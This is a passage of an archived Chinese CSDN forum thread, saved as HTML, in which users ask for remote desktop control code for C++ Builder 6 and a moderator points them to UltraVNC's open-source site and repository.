+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350808596/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350808596/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350808596/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350833719" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350833719">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhtoad"><A href="http://my.csdn.net/zhtoad" 
+        target="_blank"><IMG class="avatar" alt="zhtoad" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhtoad.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhtoad" 
+        target="_blank">zhtoad</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：35；总技术排名：214947">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" title="用户结帖率：98.21%&#10;总发帖：56&#10;正常结帖：55&#10;未结帖：1">结帖率：98.21%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="zhtoad" data-floor="4">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350833719">#4</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-24 09:42:26       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">不用跪求，我也给你。<BR></DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-4" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350833719/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350833719/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350833719/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350833719/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350833719/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350840686" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350840686">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="silverpot"><A href="http://my.csdn.net/silverpot" 
+        target="_blank"><IMG class="avatar" alt="silverpot" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_silverpot.jpg"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/silverpot" target="_blank">silverpot</A></DD>
+        <DD class="nickname">银斑蝶</DD>
+        <DD title="总技术分：3065；总技术排名：9390">等级：<IMG class="grade user5" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" title="用户结帖率：99.48%&#10;总发帖：194&#10;正常结帖：193&#10;未结帖：1">结帖率：99.48%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="silverpot" data-floor="5">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350840686">#5</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-24 12:49:16       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">            vnc开源的        </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-5" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350840686/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350840686/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350840686/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350840686/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350840686/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350849007" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350849007">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="p5831720"><A href="http://my.csdn.net/p5831720" 
+        target="_blank"><IMG class="avatar" alt="p5831720" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_p5831720.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/p5831720" target="_blank">p5831720</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：5177210">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：0&#10;正常结帖：0&#10;未结帖：0">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="p5831720" data-floor="6">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350849007">#6</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-24 16:54:43       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">真的吗？？？？？？？？？？？？？？？？        </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-6" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350849007/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350849007/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350849007/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350849007/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350849007/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350891713" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350891713">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhaozilongg"><A href="http://my.csdn.net/zhaozilongg" 
+        target="_blank"><IMG class="avatar" alt="zhaozilongg" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhaozilongg.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhaozilongg" target="_blank">zhaozilongg</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：2485996">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：3&#10;正常结帖：0&#10;未结帖：3">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="zhaozilongg" data-floor="7">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350891713">#7</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-26 11:46:54       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">谢谢啊能发我邮箱么？5609033@qq.com        </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-7" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350891713/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350891713/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350891713/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350891713/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350891713/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |    <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350891728" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350891728">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhaozilongg"><A href="http://my.csdn.net/zhaozilongg" 
+        target="_blank"><IMG class="avatar" alt="zhaozilongg" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhaozilongg.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhaozilongg" target="_blank">zhaozilongg</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：2485996">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：3&#10;正常结帖：0&#10;未结帖：3">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="zhaozilongg" data-floor="8">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350891728">#8</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-26 11:47:16       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">
+      <FIELDSET><LEGEND 
+      class="font_bold">引用&nbsp;3&nbsp;楼&nbsp;zhaozilongg&nbsp;的回复:</LEGEND>
+      <BLOCKQUOTE>还有Tmain&nbsp;*main;<BR>
+        [C++&nbsp;Error]&nbsp;unit1.cpp(17):&nbsp;E2141&nbsp;Declaration&nbsp;syntax&nbsp;error</BLOCKQUOTE></FIELDSET><BR>
+      谢谢啊能发我邮箱么？5609033@qq.com        </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-8" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350891728/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350891728/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350891728/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350891728/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350891728/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350891813" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350891813">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info user_moderator">
+        <DT class="user_head" data-username="ccrun"><A href="http://my.csdn.net/ccrun" 
+        target="_blank"><IMG class="avatar" alt="ccrun" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_ccrun.jpg"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/ccrun" 
+        target="_blank">ccrun</A><IMG title="C++ Builder版大版主" alt="版主" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_BM-b2a41d0c9db744030e8dac2188f45c33.png"></DD>
+        <DD class="nickname">妖哥@ccrun.com</DD>
+        <DD title="总技术分：218369；总技术排名：22">等级：<IMG class="grade diam1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" title="用户结帖率：98.72%&#10;总发帖：78&#10;正常结帖：77&#10;未结帖：1">结帖率：98.72%</DD>
+        <DIV class="medal_copper " title="2005年12月 总版技术专家分月排行榜第三"></DIV>
+        <DIV class="medal_red count" title="2003年9月 C++ Builder大版内专家分月排行榜第一&#10;2003年12月 C++ Builder大版内专家分月排行榜第一&#10;2004年3月 C++ Builder大版内专家分月排行榜第一&#10;2005年9月 C++ Builder大版内专家分月排行榜第一&#10;2005年10月 C++ Builder大版内专家分月排行榜第一&#10;2005年11月 C++ Builder大版内专家分月排行榜第一&#10;2005年12月 C++ Builder大版内专家分月排行榜第一&#10;2006年1月 C++ Builder大版内专家分月排行榜第一&#10;2006年11月 C++ Builder大版内专家分月排行榜第一&#10;2007年3月 C++ Builder大版内专家分月排行榜第一&#10;2007年4月 C++ Builder大版内专家分月排行榜第一&#10;2008年7月 C++ Builder大版内专家分月排行榜第一&#10;2009年3月 C++ Builder大版内专家分月排行榜第一&#10;2009年4月 C++ Builder大版内专家分月排行榜第一&#10;2009年5月 C++ Builder大版内专家分月排行榜第一&#10;2009年6月 C++ Builder大版内专家分月排行榜第一&#10;2009年7月 C++ Builder大版内专家分月排行榜第一&#10;2009年8月 C++ Builder大版内专家分月排行榜第一&#10;2009年9月 C++ Builder大版内专家分月排行榜第一&#10;2009年10月 C++ Builder大版内专家分月排行榜第一&#10;2009年11月 C++ Builder大版内专家分月排行榜第一&#10;2009年12月 C++ Builder大版内专家分月排行榜第一&#10;2010年2月 C++ Builder大版内专家分月排行榜第一&#10;2010年6月 C++ Builder大版内专家分月排行榜第一&#10;2010年7月 C++ Builder大版内专家分月排行榜第一&#10;2010年8月 C++ Builder大版内专家分月排行榜第一&#10;2010年9月 C++ Builder大版内专家分月排行榜第一&#10;2010年11月 C++ Builder大版内专家分月排行榜第一&#10;2010年12月 C++ Builder大版内专家分月排行榜第一&#10;2011年1月 C++ Builder大版内专家分月排行榜第一&#10;2011年2月 C++ Builder大版内专家分月排行榜第一&#10;2011年3月 C++ Builder大版内专家分月排行榜第一&#10;2011年4月 C++ Builder大版内专家分月排行榜第一&#10;2011年5月 C++ Builder大版内专家分月排行榜第一&#10;2011年6月 C++ Builder大版内专家分月排行榜第一&#10;2011年7月 C++ Builder大版内专家分月排行榜第一&#10;2011年9月 C++ Builder大版内专家分月排行榜第一&#10;2011年10月 C++ Builder大版内专家分月排行榜第一&#10;2011年11月 C++ Builder大版内专家分月排行榜第一&#10;2012年2月 C++ Builder大版内专家分月排行榜第一&#10;2012年3月 C++ Builder大版内专家分月排行榜第一&#10;2012年4月 C++ Builder大版内专家分月排行榜第一&#10;2012年5月 C++ Builder大版内专家分月排行榜第一&#10;2012年6月 C++ Builder大版内专家分月排行榜第一&#10;2012年7月 C++ Builder大版内专家分月排行榜第一&#10;2012年8月 C++ Builder大版内专家分月排行榜第一&#10;2012年9月 C++ Builder大版内专家分月排行榜第一&#10;2012年10月 C++ Builder大版内专家分月排行榜第一">
+        <DIV class="medal_count">48</DIV></DIV>
+        <DIV class="medal_yellow count" title="2005年8月 C++ Builder大版内专家分月排行榜第二&#10;2006年2月 C++ Builder大版内专家分月排行榜第二&#10;2006年3月 C++ Builder大版内专家分月排行榜第二&#10;2006年8月 C++ Builder大版内专家分月排行榜第二&#10;2007年2月 C++ Builder大版内专家分月排行榜第二&#10;2007年11月 C++ Builder大版内专家分月排行榜第二&#10;2008年6月 C++ Builder大版内专家分月排行榜第二&#10;2010年1月 C++ Builder大版内专家分月排行榜第二&#10;2010年5月 C++ Builder大版内专家分月排行榜第二&#10;2010年10月 C++ Builder大版内专家分月排行榜第二&#10;2011年8月 C++ Builder大版内专家分月排行榜第二&#10;2011年12月 C++ Builder大版内专家分月排行榜第二&#10;2012年1月 C++ Builder大版内专家分月排行榜第二">
+        <DIV class="medal_count">13</DIV></DIV><A class="more_medals" href="http://bbs.csdn.net/users/ccrun/medals" 
+        target="_blank">更多勋章</A></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info star" data-username="ccrun" data-floor="9">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350891813">#9</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-26 11:49:43       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">            UltraVNC官方网站：http://www.uvnc.com/<BR>
+      源代码：http://ultravnc.svn.sourceforge.net/viewvc/ultravnc/UltraVNC%20Project%20Root/UltraVNC/ 
+             </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-9" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350891813/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[1]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350891813/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350891813/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350891813/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350891813/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350898777" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350898777">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="zhaozilongg"><A href="http://my.csdn.net/zhaozilongg" 
+        target="_blank"><IMG class="avatar" alt="zhaozilongg" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_zhaozilongg.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/zhaozilongg" target="_blank">zhaozilongg</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：0；总技术排名：2485996">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" 
+        title="用户结帖率：0%&#10;总发帖：3&#10;正常结帖：0&#10;未结帖：3">结帖率：0%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="zhaozilongg" data-floor="10">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350898777">#10</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-26 15:20:45       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">
+      <FIELDSET><LEGEND 
+      class="font_bold">引用&nbsp;9&nbsp;楼&nbsp;ccrun&nbsp;的回复:</LEGEND>
+      <BLOCKQUOTE>UltraVNC官方网站：http://www.uvnc.com/<BR>
+        源代码：http://ultravnc.svn.sourceforge.net/viewvc/ultravnc/UltraVNC%20Project%20Root/UltraVNC/</BLOCKQUOTE></FIELDSET><BR>
+      谢谢妖哥啊        </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-10" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350898777/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350898777/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350898777/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350898777/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350898777/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE>
+<TABLE id="post-350951230" class="post  " border="0" cellSpacing="0" 
+cellPadding="0" data-post-id="350951230">
+  <COLGROUP>
+  <COL width="180">
+  <COL></COLGROUP>
+  <TBODY>
+  <TR>
+    <TD class="wirter" vAlign="top" rowSpan="4">
+      <DL class="user_info ">
+        <DT class="user_head" data-username="Nevesly"><A href="http://my.csdn.net/Nevesly" 
+        target="_blank"><IMG class="avatar" alt="Nevesly" src="注释详细BCB6下的远程桌面控制的代码程序_files/1_nevesly.gif"></A></DT>
+        <DD class="username"><A href="http://my.csdn.net/Nevesly" target="_blank">Nevesly</A></DD>
+        <DD class="nickname">该用户很懒,没设置昵称</DD>
+        <DD title="总技术分：27；总技术排名：235676">等级：<IMG class="grade user1" alt="Blank" 
+        src="注释详细BCB6下的远程桌面控制的代码程序_files/blank.gif"></DD>
+        <DD class="close_rate" title="用户结帖率：96.43%&#10;总发帖：28&#10;正常结帖：27&#10;未结帖：1">结帖率：96.43%</DD></DL></TD>
+    <TD style="display: none;"></TD></TR>
+  <TR class="post_info " data-username="Nevesly" data-floor="11">
+    <TD class="data"><SPAN class="fr"><A href="http://bbs.csdn.net/topics/350001529#post-350951230">#11</A>得分：0 
+               </SPAN><SPAN class="time">回复于：          2010-08-29 02:03:03       
+       </SPAN></TD></TR>
+  <TR>
+    <TD>
+      <DIV class="post_body">
+      <FIELDSET><LEGEND 
+      class="font_bold">引用&nbsp;10&nbsp;楼&nbsp;zhaozilongg&nbsp;的回复:</LEGEND>
+      <BLOCKQUOTE>引用&nbsp;9&nbsp;楼&nbsp;ccrun&nbsp;的回复:<BR>
+        UltraVNC官方网站：http://www.uvnc.com/<BR>
+        源代码：http://ultravnc.svn.sourceforge.net/viewvc/ultravnc/UltraVNC%20Project%20Root/UltraVNC/<BR>
+        <BR>谢谢妖哥啊</BLOCKQUOTE></FIELDSET><BR>我也想下，可是进那地址后都不知道该点哪个来下载。。。。有谁指点一下么？   
+           </DIV></TD></TR>
+  <TR>
+    <TD class="control">
+      <DIV id="post-forum-bulletin-11" class="fl"></DIV>
+      <DIV class="fr"><A class="red digg" href="http://bbs.csdn.net/posts/350951230/digg?topic_id=350001529" 
+      rel="nofollow" data-method="put" data-remote="true">对我有用[0]</A><A class="bury" 
+      href="http://bbs.csdn.net/posts/350951230/bury?topic_id=350001529" rel="nofollow" 
+      data-method="put" data-remote="true">丢个板砖[0]</A><A class="quote" href="http://bbs.csdn.net/topics/350001529#quote">引用</A> 
+      |          <A class="fancybox red" href="http://bbs.csdn.net/posts/350951230/report?topic_id=350001529">举报 
+      </A> |          <SPAN class="manage-toggle">
+      <DIV style="display: none;" class="manage"><A class="fancybox" href="http://bbs.csdn.net/posts/350951230/edit">编辑</A><A 
+      class="fancybox" 
+      href="http://bbs.csdn.net/posts/350951230/destroy_edit">删除</A></DIV>       
+           管理          </SPAN> |          <A href="http://bbs.csdn.net/topics/350001529#">TOP</A></DIV></TD></TR>
+  </TBODY></TABLE></DIV>
+<DIV class="control_area">
+<FORM id="form" name="form">
+<DIV class="control">
+<UL>
+  <LI class="drop_menu_wrap drop_menu_up"><A class="drop_toggle drop_toggle_up btn_1" 
+  href="http://bbs.csdn.net/topics/350001529#"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_set.gif">管理菜单<IMG 
+  alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/arrow_down.gif"></SPAN></A>
+  <UL style="bottom: 26px; display: none;" class="drop_menu">
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/top">置顶</A></LI>
+    <LI><A href="http://bbs.csdn.net/topics/350001529/recommend" rel="nofollow" 
+    data-method="put" 
+    data-confirm="确定要将该帖推荐(加精)吗？被推荐的帖子将给帖主奖励可用分88分!">推荐</A></LI>
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/lock">锁定</A></LI>
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/move">移动</A></LI>
+    <LI><A class="fancybox" 
+    href="http://bbs.csdn.net/topics/350001529/edit">编辑</A></LI>
+    <LI><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/destroy_edit">删除</A></LI>
+    <LI><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/add_point">帖子加分</A></LI>
+    <LI><A class="fancybox" href="http://bbs.csdn.net/topics/350001529/highlight">帖子高亮</A></LI></UL></LI>
+  <LI><A class="btn_1" 
+  href="http://bbs.csdn.net/topics/350001529/close"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_over.gif">结帖</SPAN></A></LI>
+  <LI><A class="btn_1" 
+  href="http://bbs.csdn.net/topics/new?forum_id=BCBBase"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_publish.gif">发帖</SPAN></A></LI>
+  <LI><A class="btn_1" 
+  href="http://bbs.csdn.net/topics/350001529#new_post"><SPAN><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/ico_return.gif">回复</SPAN></A></LI></UL></DIV></FORM>
+</DIV>
+<DIV class="comt">
+<DIV class="ad_l"><!-- 回复框文字 (D6) -->
+<UL>
+  <LI><A href="http://g.csdn.net/5235871" 
+  target="_blank">点击下载并深入了解IBM云计算</A></LI>
+  <LI><A href="http://g.csdn.net/5236020" 
+  target="_blank">Hadoop与大数据精彩议题发布</A></LI>
+  <LI><A href="http://g.csdn.net/5236021" 
+target="_blank">【免费】解读海外市场营销奥秘</A></LI>
+  <LI><A href="http://g.csdn.net/5236073" target="_blank">IBM Flex 
+  System刀片式服务器</A></LI></UL>
+<UL>
+  <LI><A style="color: black;" href="http://hui.csdn.net/MeetingInfo.aspx?MID=151" 
+  target="_blank">【西安】开源云活动免费报名</A></LI>
+  <LI><A style="color: black;" href="http://bbs.csdn.net/topics/390167772" 
+  target="_blank">编程马拉松团队火热招募中</A></LI>
+  <LI><A style="color: black;" href="http://hbtc2012.hadooper.cn/" target="_blank">Hadoop与大数据精彩议题发布</A></LI>
+  <LI><A style="color: black;" href="http://mdcc.csdn.net/" 
+  target="_blank">移动开发者大会最新议题发布</A></LI></UL>
+<DIV style="padding: 0px 0px 50px;" class="ad_new">
+<H4><IMG alt="" src="注释详细BCB6下的远程桌面控制的代码程序_files/csdn_logo_blue.gif"></H4>
+<P class="title"><A href="http://events.csdn.net/DR2012/roadshow/index.html" 
+target="_blank">免费解读海外市场营销  </A></P>
+<P class="con"><A href="http://events.csdn.net/DR2012/roadshow/index.html" 
+target="_blank">您的发展即是我们的使命，以吾之力，助尔之翼，成就你卓越的羽翼。</A></P></DIV></DIV>
+<DIV class="reply">
+<FORM id="new_post" class="new_post" accept-charset="UTF-8" method="post" 
+action="/posts?topic_id=350001529">
+<DIV style="margin: 0px; padding: 0px; display: inline;"><INPUT name="utf8" 
+value="✓" type="hidden"><INPUT name="authenticity_token" value="T8xeUfN8PG060oAeyMzYx2cUcW/BBM/uAlpWBlaHblQ=" 
+type="hidden"></DIV>
+<DIV><STRONG>回复内容</STRONG></DIV>
+<DIV class="editor"><TEXTAREA id="post_body" class="required quoteOnly" cols="40" rows="20" name="post[body]"></TEXTAREA>
